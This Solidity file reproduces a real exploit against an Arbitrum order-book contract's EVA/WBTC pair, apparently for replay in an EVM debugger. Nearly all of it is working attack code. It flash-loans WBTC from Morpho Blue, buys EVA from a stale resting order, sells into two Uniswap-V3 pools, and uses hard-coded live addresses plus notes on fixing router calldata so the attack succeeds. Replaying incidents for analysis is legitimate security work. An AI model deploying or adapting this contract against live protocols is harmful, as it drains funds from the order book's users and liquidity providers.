// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Standalone synthetic exploit contract for the playground's client-side EVM
// debugger. Mirrors the real Foundry PoC's `onMorphoFlashLoan` body exactly
// (see registry test/EverValueCoin_exp.sol) but with NO Test/forge-std
// inheritance, so no EXTCODESIZE-of-cheatcode-address check can ever run
// before the real exploit logic executes in the recorder.
//
// Real exploit summary: OrderBookFactory (Arbitrum, EVA/WBTC pair) settles
// matched orders at the RESTING maker order's stale price with no oracle or
// slippage bound. A 100,000-EVA sell order sat on the book at price 14746
// (~0.0001475 WBTC/EVA) while Uniswap-V3 paid ~0.0001673 WBTC/EVA. The
// attacker flash-loans WBTC from Morpho Blue, buys 60,000 EVA from the book
// at the stale price, dumps it on two Uniswap-V3 pools at the live price, and
// repays the loan, pocketing the ~12% spread.
//
// Attacker : https://arbiscan.io/address/0xaa06fde501a82ce1c0365273684247a736885daf
// Attack Contract : https://arbiscan.io/address/0x2fad746cfaaf68aa098f704fb6537b0a05786df8
// Vulnerable Contract : https://arbiscan.io/address/0x03339ecae41bc162dacae5c2a275c8f64d6c80a0 (logic in PairLib)
// Attack Tx : https://arbiscan.io/tx/0xb13b2ab202cb902b8986cbd430d7227bf3ddca831b79786af145ccb5f00fcf3f

interface IERC20Min {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

interface Iorderbook {
    function addNewOrder(bytes32 _pairId, uint256 _quantity, uint256 _price, bool _isBuy, uint256 _timestamp)
        external;
}

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

// uniV3Router (0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45) is a SwapRouter02-style
// router (verified via its fetched proxy label): its ExactInputSingleParams
// struct has NO `deadline` field (7 fields, not 8). Calling it with the classic
// 8-field ISwapRouter struct above silently misencodes the calldata (every field
// after `recipient` shifts by one slot) and the call reverts with no reason.
// Confirmed against the real historical attack tx via `cast run`, which decodes
// this router's call as the 7-field variant. swapRouter (0x1b81D678...) is a
// PancakeSwap-V3-style router that DOES keep the 8-field/deadline layout, so it
// keeps using ISwapRouter above.
interface IV3SwapRouterNoDeadline {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

interface IMorphoBuleFlashLoan {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

contract EverValueCoin {
    IERC20Min constant wbtc = IERC20Min(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IERC20Min constant eva = IERC20Min(0x45D9831d8751B2325f3DBf48db748723726e1C8c);
    Iorderbook constant orderbook = Iorderbook(0x03339ECAE41bc162DAcAe5c2A275C8f64D6c80A0);
    IMorphoBuleFlashLoan constant morphoBlue = IMorphoBuleFlashLoan(0x6c247b1F6182318877311737BaC0844bAa518F5e);
    // Two distinct Uniswap-V3-compatible routers are used, one per pool the
    // real attack tx dumped EVA into (0x42a4... and 0x57df... in the writeup).
    IV3SwapRouterNoDeadline constant uniV3Router = IV3SwapRouterNoDeadline(payable(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45));
    ISwapRouter constant swapRouter = ISwapRouter(payable(0x1b81D678ffb9C0263b24A97847620C99d213eB14));

    /// @notice Entry point: flash-loans 12 WBTC from Morpho Blue, which calls
    /// back into onMorphoFlashLoan to run the actual attack.
    function attack() external {
        morphoBlue.flashLoan(address(wbtc), 1200000000, "");
    }

    function onMorphoFlashLoan(uint256, bytes calldata) external {
        approve();

        // Buy 60,000 EVA from the order book's stale 14746 resting sell order
        // (limit price 15000 >= 14746 so it crosses and settles at 14746).
        bytes32 pairId = 0x3e0eda1b16003a6bbf05702d0b0474c698229478dc3cf66aa0f56dcb3d4df98f;
        uint256 quantity = 60000000000000000000000;
        uint256 price = 15000;
        bool isBuy = true;
        uint256 timestamp = block.timestamp;
        orderbook.addNewOrder(pairId, quantity, price, isBuy, timestamp);

        // Dump the 60,000 EVA on two Uniswap-V3 pools at the live market price.
        uniV3Router.exactInputSingle(
            IV3SwapRouterNoDeadline.ExactInputSingleParams({
                tokenIn: address(eva),
                tokenOut: address(wbtc),
                fee: 10000,
                recipient: address(this),
                amountIn: 30000000000000000000000,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        swapRouter.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(eva),
                tokenOut: address(wbtc),
                fee: 10000,
                recipient: address(this),
                deadline: block.timestamp + 100,
                amountIn: 30000000000000000000000,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        // Flash loan has no fee; Morpho pulls the 12 WBTC principal back via
        // the pre-set allowance below once this callback returns.
    }

    function approve() public {
        wbtc.approve(address(morphoBlue), 1200000000);
        wbtc.approve(address(orderbook), 1000000000000000000);
        eva.approve(address(uniV3Router), 1000000000000000000000000000000);
        eva.approve(address(swapRouter), 18978678676000000000000000000);
    }
}
